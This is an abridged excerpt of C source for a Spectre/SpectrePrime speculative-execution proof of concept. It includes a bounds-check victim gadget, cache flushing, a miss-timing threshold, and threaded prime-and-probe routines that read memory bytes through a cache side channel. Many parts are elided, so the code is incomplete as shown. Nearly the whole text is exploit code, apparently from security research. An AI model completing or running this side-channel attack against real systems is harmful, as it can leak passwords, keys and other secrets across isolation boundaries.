...
void victim_function(size_t x)
{
	if (x < array1_size) {
		 ...
		 * both break Spectre & SpectrePrime in our experiments
		 */
		array2[array1[x] * 512] = MAGIC_BYTE;
	}
}
...
Analysis code
 ********************************************************************/
#define CACHE_MISS_THRESHOLD (200) /* assume cache miss if time >= threshold */

unsigned int prime()
{
	unsigned int junk = 0u;
...
void test(size_t malicious_x, int tries)
{
	...
	for (j = 29; j >= 0; j--) {
		...
		_mm_clflush((void const *)&array1_size);
		for (z = 0; z < 100; z++) {
			__asm__("nop");
...
void probe(unsigned int junk, int tries, int results[256])
{
	int i, mix_i;
...
{ //int junk, int tries, int results[256]) {
	...
	struct pp_arg_struct *args = (struct pp_arg_struct *)arguments;
	unsigned int junk = args->junk;
...
{ //size_t malicious_x, int tries) {
	struct pt_arg_struct *args = (struct pt_arg_struct *)arguments;
...
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	...
	for (tries = 999; tries > 0; tries--) {
		...
		pthread_create(&pp_thread, NULL, primeProbe, (void *)&pp_args);
		pthread_create(&pt_thread, NULL, primeTest,  (void *)&pt_args);
...
int main(int argc, const char **argv)
{
	...
	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = MAGIC_BYTE; /* write to array2 so in RAM not copy-on-write zero pages */
